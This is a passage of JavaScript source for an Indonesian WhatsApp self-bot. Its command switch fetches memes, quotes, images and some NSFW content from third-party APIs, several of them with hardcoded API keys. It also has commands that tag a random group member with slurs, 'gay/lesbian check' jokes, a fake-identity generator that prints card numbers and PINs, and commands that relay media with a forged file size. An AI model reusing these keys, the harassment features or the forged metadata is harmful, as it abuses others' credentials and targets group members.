                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/samehadaku?q=${F}`)
                   anu2 = await getBuffer(anu.thumb)
                   anu1 = `➻ *JUDUL* : ${anu.title}\n`
                   anu1 += `➻ *LINK* : ${anu.link}\n`
                   anu1 += `➻ *DESK* : ${anu.desc}\n`
                   client.sendMessage(from, anu2, image, {caption: anu1, quoted: mek })
                   break;
      case 'neon1':                                        
                   F = body.slice(7)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/neon_light?text=${F}`)
                   nayla.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: ftroli})
                   break;  
       case 'text3d':                    
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/text3d?text=${F}`)
                   nayla.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: ftroli})
                   break;                   
       case 'galaxy':                 	                 
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/galaxywp?text=${F}`)
                   nayla.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: ftroli})
                   break
      case 'gaming':                     
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/gaming?text=${F}`)
                   client.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: ftroli})
                   break;
      case 'colors':                   	                   
                   F = body.slice(8)				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/watercolor?text=${F}`)
                   client.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: ftroli})
                   break;
       case 'kling':                     
                   var F = body.slice(7)
				   var F1 = F.split("&")[0];
				   var F2 = F.split("&")[1];    				    
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/sparkling?text1=${F1}&text2=${F2}`)
                   client.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: mek})
                   break;
       case 'infonomer':                    
                   F = body.slice(11)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${F}`)
                   anu1 = `➻ *NOMER* : ${anu.nomor}\n`
                   anu1 += `➻ *JUDUL* : ${anu.op}\n`
                   anu1 += `➻ *JUDUL* : ${anu.international}\n`
                   reply(anu1)
                   break;       
       case 'fml':                      
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fml`)
                   anu1 = `➻ *FML* : ${anu.result.fml}`
                   reply(anu1)
                   break;
       case 'cinta':                     
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/katacinta`)
                   anu1 = `➻ *KATA CINTA* : ${anu.result}`
                   reply(anu1)
                   break;                                                                            
      case 'twich':                     
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/twichquote`)
                   anu1 = `➻ *THWICH* : ${anu.result}`
                   reply(anu1)
                   break;                   
      case 'fake':                     
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
                   anu1 = `➻ *NAMA* : ${anu.name}\n`
                   anu1 += `➻ *GENDER* : ${anu.gender}\n` 
                   anu1 += `➻ *AGE* : ${anu.age}\n`
                   anu1 += `➻ *BIRTDAY* : ${anu.birtday}\n`
                   anu1 += `➻ *BACHELOR* : ${anu.Bachelor}\n`
                   anu1 += `➻ *ADDRESA* : ${anu.address}\n`
                   anu1 += `➻ *CODE* : ${anu.zip_code}\n`
                   anu1 += `➻ *STATE* : ${anu.state}\n`
                   anu1 += `➻ *COUNTRY* : ${anu.country}\n`
                   anu1 += `➻ *EMAIL* : ${anu.email}\n`
                   anu1 += `➻ *PASS* : ${anu.password}\n` 
                   anu1 += `➻ *PHONE* : ${anu.phone}\n` 
                   anu1 += `➻ *CARD* : ${anu.card}\n`
                   anu1 += `➻ *CODE* : ${anu.code}\n`
                   anu1 += `➻ *DATE* : ${anu.date}\n`
                   anu1 += `➻ *PIN* : ${anu.pin_code}\n`
                   anu1 += `➻ *WEIGHT* : ${anu.weight}\n` 
                   anu1 += `➻ *HEIGHT* : ${anu.height}\n` 
                   anu1 += `➻ *TYPE* : ${anu.blood_type}\n`
                   anu1 += `➻ *STATUS* : ${anu.status}\n`
                   reply(anu1)
                   break;     
      case 'qrcode':                                                         
                   F = body.slice(8)
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/qrcode?text=${F}`)
                   client.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: mek})
                   break
      case 'resepmasakan':                    
                   if (args.length < 1) return reply(`${prefix} bakso`)
                   F = body.slice(14)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/resep?q=${F}`)
                   anu1 = await getBuffer(anu.img)
                   anu2 = `➻ *NAMA* : ${anu.title}\n`
                   anu2 += `➻ *STATUS* : ${anu.langkah}\n`
                   anu2 += `➻ *BAHAN* : ${anu.bahan}\n`
                   client.sendMessage(from, anu1, image, {caption: anu2, quoted: mek})
                   break
      case 'barcode':                                        
                   F = body.slice(9)
                   anu = await getBuffer(`https://docs-jojo.herokuapp.com/api/barcode_maker?text=${F}`)
                   client.sendMessage(from, anu, image, {caption: `Mau beli sc? hubungi saya😎`, quoted: ftroli})
                   break;
     case 'cersex1':                     	
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cersex`)                   
                   anu2 = `➻ *JUDUL* : ${anu.result.judul}\n`
                   anu2 += `➻ *NAMA* : ${anu.result.cersex}\n`
                   reply(anu2)
                   break;
      case 'cerpen':                                      
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)                   
                   anu1 = `➻ *JUDUL* : ${anu.result.title}\n`
                   anu1 += `➻ *PENGARANG* : ${anu.result.pengarang}\n` 
                   anu1 += `➻ *KATEGORI* : ${anu.result.kategori}\n`
                   anu1 += `➻ *CERPEN* : ${anu.result.cerpen}\n`
                   reply(anu1)
                   break;                  
      case 'tongue':                     
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/tongue_twister`)
                   anu1 = `➻ *NIHH* : ${anu.result}`
                   reply(anu1)
                   break;      
       case 'pantun':                    	
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/random_pantun`)
                   anu1 = `➻ *PANTUN* : ${anu.result}\n` 
                   reply(anu1)
                   break; 
       case 'cuaca':                     	                    	 
                   if (args.length < 1) return reply(`${prefix}makassar`)                    
                   F = body.slice(7)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cuaca?q=${F}`)
                   anu1 = `➻ *TEMPAT* : ${anu.result.tempat}\n`
                   anu1 += `➻ *CUAXA* : ${anu.result.cuaca}\n`
                   anu1 += `➻ *DESK* : ${anu.result.desk}\n` 
                   anu1 += `➻ *SUHU* : ${anu.result.suhu}\n`
                   anu1 += `➻ *KELEBAPAN* : ${anu.result.kelembapan}\n` 
                   anu1 += `➻ *UDARA* : ${anu.result.udara}\n`
                   anu1 += `➻ *ANGIN* : ${anu.result.angin}\n` 
                   reply(anu1)
                   break; 
       case 'namaninja':                                        
                   F = body.slice(11)
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/ninja_name?name=${F}`)
                   anu1 = `➻ *NAMA* : ${anu.your_name}\n`
                   anu1 += `➻ *NINJA* : ${anu.result}\n`
                   reply(anu1)
                   break;
				case 'nsfwneko':			
				anu = await fetchJson(`https://iwi-negev.herokuapp.com/api/nsfw/nsfwneko?apikey=GFL`)
				dapuhy = await getBuffer(anu.result)
				client.sendMessage(from, dapuhy, image, {quoted: ftroli})				
				break;
				case 'artinama':                                
                anu = await fetchJson(`http://zekais-api.herokuapp.com/artinama?nama=${body.slice(9)}`)
                dapuhy = `Nama : ${anu.name}\nArti : ${anu.result}`
                client.sendMessage(from, dapuhy, text, {quoted: ftroli})                
                break;
                case 'artinama1':		
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Akira`)
                    ini_nama = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/artinama?apikey=${LolHuman}&nama=${ini_nama}`)
                    reply(get_result.result)
                    break;
                    case 'cewek':
				client.updatePresence(from, Presence.composing) 				 
				reply(mess.wait)
				 data = fs.readFileSync('./lib/cewek.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 cewek = await getBuffer(randKey.result)
                 client.sendMessage(from, cewek, image, {quoted: mek, caption: '\`\`\CEWE GUA BOS😎\`\`\`'})				 
				break;
				 case 'indonesia':                       
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/cewe/indonesia?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: ftroli})			
            break;
            case 'thailand':                       
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/cewe/thailand?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: ftroli})			
            break;
             case 'vietnam':                       
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/cewe/vietnam?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: ftroli})			
            break;
             case 'china':                       
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/cewe/china?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: ftroli})			
            break
             case 'malaysia':                       
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/cewe/malaysia?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: ftroli})			
            break;
             case 'korea':                       
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/cewe/korea?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: ftroli})			
            break;
             case 'japan':                       
            ojan = await fetchJson(`https://api-idoganz.herokuapp.com/api/cewe/japan?apikey=Alphabot`)
     		pideo = await getBuffer(ojan.result.url)
	    	client.sendMessage(from, pideo, image, {quoted: ftroli})			
            break;    								
				case 'cowok':
				client.updatePresence(from, Presence.composing) 				 
				reply(mess.wait)
				 data = fs.readFileSync('./lib/cowok.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                 cowok = await getBuffer(randKey.result)
                 client.sendMessage(from, cowok, image, {quoted: mek, caption: '\`\`\`ASUPAN COGAN\`\`\`'})				 
				break;      
                case 'truth':                 
				const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
				const ttrth = trut[Math.floor(Math.random() * trut.length)]
				truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
				client.sendMessage(from, truteh, image, { caption: 'Truth\n\n'+ ttrth, quoted: ftroli })				
				break;
				case 'dare':                 
				const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
				const der = dare[Math.floor(Math.random() * dare.length)]
				tod = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
				client.sendMessage(from, tod, image, { quoted: ftroli, caption: 'Dare\n\n'+ der })				
				break;
				case 'bisakah':                 
				bisakah = body.slice(1)
				const bisa =['Bisa','Tidak Bisa','Coba Ulangi']
				const keh = bisa[Math.floor(Math.random() * bisa.length)]
				client.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: ftroli })				
				break;
		        case 'kapankah':                
				kapankah = body.slice(1)
				const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
				const koh = kapan[Math.floor(Math.random() * kapan.length)]
				client.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: ftroli })				
				break;
		        case 'apakah':                 
				apakah = body.slice(1)
				const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
				const kah = apa[Math.floor(Math.random() * apa.length)]
				client.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: ftroli })				
				break;
		        case 'bagaimanakah':                 
				bagaimanakah = body.slice(1)
				const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Coba Ulangi','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
				const mana = bagai[Math.floor(Math.random() * bagai.length)]
				client.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: ftroli })				
				break;
				case 'setbio':
				if (!mek.key.fromMe) return fakestatus("SELF-BOT");
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					client.setStatus(`${iyek}`)
					sendFakeStatus(from, '𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺', fake)
					break;			
					case 'setnameido':
					if (!mek.key.fromMe) return fakestatus("SELF-BOT");
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                client.updateProfileName(anu)
                sendFakeStatus(from, '𝘴𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺', fake)
                break;
		        case 'rate':                
				rate = body.slice(1)
				const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
				const te = ra[Math.floor(Math.random() * ra.length)]
				client.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: ftroli })				
				break;
                case 'sangecek2':                
				sange = body.slice(1)
				const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
				const nge = sang[Math.floor(Math.random() * sang.length)]
				client.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: ftroli })				
				break;
                case 'gaycek':                 
				gayy = body.slice(1)
				const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
				const yag = gay[Math.floor(Math.random() * gay.length)]
				client.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: ftroli })				
				break;
                case 'lesbicek2':                 
				lesbii = body.slice(1)
				const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
				const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
				client.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, { quoted: ftroli })				
				break;
                case 'gantengcek2':                 
				ganteng = body.slice(1)
				const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
				const teng = gan[Math.floor(Math.random() * gan.length)]
				client.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: ftroli })				
				break;
				case 'pantun':
				ganz = await fetchJson(`https://myhuman.herokuapp.com/api/pantun`)
				reply(ganz.result)
				break;
				case 'katailham':
				ganz = await fetchJson(`https://myhuman.herokuapp.com/api/katailham`)
				reply(ganz.result)
				break;
				case 'hilih':
				bud = await fetchJson(`https://janbot-api.herokuapp.com/api/hilih?kata=${q}`)
				reply(bud.teks.after)
				break;
				case 'heleh':
				bud = await fetchJson(`https://janbot-api.herokuapp.com/api/heleh?kata=${q}`)
				reply(bud.teks.after)
				break;
				case 'holoh':
				bud = await fetchJson(`https://janbot-api.herokuapp.com/api/holoh?kata=${q}`)
				reply(bud.teks.after)
				break;
				case 'halah':
				bud = await fetchJson(`https://janbot-api.herokuapp.com/api/halah?kata=${q}`)
				reply(bud.teks.after)
				break;
				case 'huluh':
				bud = await fetchJson(`https://janbot-api.herokuapp.com/api/huluh?kata=${q}`)
				reply(bud.teks.after)
				break;
				//quotes
				case 'quotes':
				yaha = await fetchJson(`https://myhuman.herokuapp.com/api/quotes`)
				reply(yaha.quotes)
				break;
				case 'quotes2':
				yaha = await fetchJson(`https://myhuman.herokuapp.com/api/quotes2`)
				reply(yaha.quotes)
				break;
				case 'faktaunik':
				yaha = await fetchJson(`https://myhuman.herokuapp.com/api/faktaunik`)
				reply(yaha.result)
				break;
				case 'katabucin':
				yaha = await fetchJson(`https://myhuman.herokuapp.com/api/bucin`)
				reply(yaha.result)
				break;
				case 'katabucin2':
				yaha = await fetchJson(`https://myhuman.herokuapp.com/api/quotes`)
				reply(yaha.quotes)
				break;
				case 'katailham':
				yaha = await fetchJson(`https://myhuman.herokuapp.com/api/katailham`)
				reply(yaha.result)
				break;
				case 'katabijak':
				yaha = await fetchJson(`https://myhuman.herokuapp.com/api/katabijak`)
				reply(yaha.result)
				break;
				 case 'cekmati':
              if (!q) return reply('nama nya?')
              predea = await fetchJson(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.name}\n*Mati Pada Umur :* ${predea.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break;
              case 'size':
if (args.length < 1) return reply('Masukan angkanya')
filsize = args[0]
costick = await client.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:mek})
client.relayWAMessage(costick)
break;
case 'sizeimg':
if (args.length < 1) return reply('Masukan angkanya')
filsizei = args[0]
costick3 = await client.prepareMessageFromContent(from,{
"imageMessage": {
	"url": m.quoted.url,
	"mimetype": m.quoted.mimetype,
	"caption": m.quoted.caption,
	"fileSha256": m.quoted.fileSha256.toString('base64'),
	"fileLength": filsizei,
	"height": m.quoted.height,
	"width": m.quoted.width,
	"mediaKey": m.quoted.mediaKey.low,
	"jpegThumbnail": m.quoted.jpegThumbnail
}
}, {quoted:mek})
client.relayWAMessage(costick3)
break;
		        case 'cantikcek2':                 
				cantik = body.slice(1)
				const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
				const tik = can[Math.floor(Math.random() * can.length)]
				client.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: ftroli })				
				break;
				case 'bego':
      case 'sampah':
      case 'pinter':
      case 'babu':
      case 'asu':
      case 'bodoh':
      case 'gay':
      case 'lesby':
      case 'bajingan':
      case 'jancok':
      case 'anjing':
      case 'ngentod':
      case 'cupu':
      case 'monyet':
      case 'mastah':
      case 'newbie':
      case 'bangsat':
      case 'bangke':
      case 'sange':
      case 'sangean':
      case 'dakjal':
      case 'horny':
      case 'wibu':
      case 'puki':
      case 'kaumcoli':
      case 'pantek':           
        membr = []
        const pff = groupMembers
        const go = groupMembers
        const goo = pff[Math.floor(Math.random() * pff.length)]
        const oe = go[Math.floor(Math.random() * go.length)]
        teks = `*Yang Paling ${command} Disini Adalah :* @${goo.jid.split('@')[0]} Damsarr ${command}`
        membr.push(goo.jid)
        mentions(teks, membr, true)
        break;
				case 'gantengcek':
                    N = `KE *GANTENGAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😎`
                    reply(N)
                    break; 
                    case 'cantikcek':
                    N = `KE *CANTIKAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}% 😁*`
                    reply(N)
                    break;
                    case 'jelekcek':
                    N = `KE *J3L3K4N* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🤢`
                    reply(N)
                    break;
                    case 'goblokcek':
                    N = `KE *GOBLOKAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🤣`
                    reply(N)
                    break; 
                    case 'begocek':
                    N = `KE *BEGO* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😂`
                    reply(N)
                    break; 
                    case 'pintercek': 
                    N = `KE *PINTARAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😗`
                    reply(N)
                    break;
                    case 'jagocek': 
                    N = `KE *JAGOAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 💪`
                    reply(N)
                    break; 
                    case 'nolepcek': 
                    N = `KE *NOLEPAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🧐`
                    reply(N)
                    break; 
                    case 'babicek': 
                    N = `KE *BABIAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🤪`
                    reply(N)
                    break; 
                    case 'bebancek':
                    N = `KE *BEBANAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🤬`
                    reply(N)
                    break; 
                    case 'baikcek': 
                    N = `KE *BAIKAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😇`
                    reply(N)
                    break; 
                    case 'jahatcek': 
                    N = `KE *JAHATAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😈`
                    reply(N)
                    break; 
                    case 'anjingcek': 
                    N = `KE *ANJINGAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 👀`
                    reply(N)
                    break;                      
                    case 'haramcek':
                    N = `KE *HARAMAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🥴`
                    reply(N)
                    break;  
                    case 'kontolcek': 
                    N = `KE *KOMTOLAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🙂`
                    reply(N)
                    break; 
                    case 'pakboycek': 
                    N = `KE *PAKBOYZ* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😏`
                    reply(N)
                    break; 
                    case 'pakgirlcek':	
                    N = `KE *PAKGILR* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😏`
                    reply(N)
                    break;             
                    case 'sangecek':
                    N = `JIWA *SANGE* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 🤤`
                    reply(N)
                    break;
                    case 'bapercek':
                    N = `JIWA *BEPERAN* KAMU\n`
                    N += `ADALAH : *${dap3}${dap4}%* 😘`
                    reply(N)
                    break;
                    case 'foliokiri':		                 
				if (args.length < 1) return reply(`${prefix} Harus Nulis Apa Kak??`)
				F = body.slice(11)				
				anu = await getBuffer(`https://zekais-api.herokuapp.com/foliokiri?text=${F}&apikey=vE52KkvP`)
				client.sendMessage(from, anu, image, {caption: 'Nih kak udah jadi..', quoted: mek})				
				break;
				case 'bukukanan':		                 
				if (args.length < 1) return reply(`${prefix} Harus Nulis Apa Kak??`)
				F = body.slice(11)				
				anu = await getBuffer(`https://zekais-api.herokuapp.com/bukukanan?text=${F}&apikey=vE52KkvP`)
				client.sendMessage(from, anu, image, {caption: 'Nih kak udah jadi..', quoted: mek})				
				break;
				case 'bukukiri':		                 
				if (args.length < 1) return reply(`${prefix} Harus Nulis Apa Kak??`)
				F = body.slice(10)				
				anu = await getBuffer(`https://zekais-api.herokuapp.com/bukukiri?text=${F}&apikey=vE52KkvP`)
				client.sendMessage(from, anu, image, {caption: 'Nih kak udah jadi..', quoted: mek})				
				break;				
                case 'juventusshirt':                 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}|17`)
                ct = args.join(" ")
                dap1 = ct.split("|")[0];
                dap2 = ct.split("|")[1];                
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/ephoto2/juventusshirt?apikey=${LolHuman}&text1=${dap1}&text2=${dap2}`)
                client.sendMessage(from, dapuhy, image, {quoted: ftroli})
                break;
                case 'valorantbanner':                 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}|mengkeren|cuy`)
                ct = args.join(" ")                
                dap1 = ct.split("|")[0];
                dap2 = ct.split("|")[1];
                dap3 = ct.split("|")[2];
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/ephoto3/valorantbanner?apikey=${LolHuman}&text1=${dap1}&text2=${dap2}&text3=${dap3}`)
                client.sendMessage(from, dapuhy, image, {quoted: ftroli})                
                break;
                case 'hartatahta':
                case 'hartacustom':                 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dppa = args.join(" ")                
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${LolHuman}&text=${dppa}`)
                client.sendMessage(from, dapuhy, image, {quoted: ftroli})                
                break;
                case 'ytkomen':                 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}|mengkeren|https://i.ibb.co/tpVB90V/20210411-171126.jpg`)
                ct = args.join(" ")                
                dap1 = ct.split("|")[0];
                dap2 = ct.split("|")[1];
                dap3 = ct.split("|")[2];
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/ytcomment?apikey=${LolHuman}&username=${dap1}&comment=${dap2}&img=${dap3}`)
                client.sendMessage(from, dapuhy, image, {quoted: ftroli})                
                break;
                case 'attp':                 
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
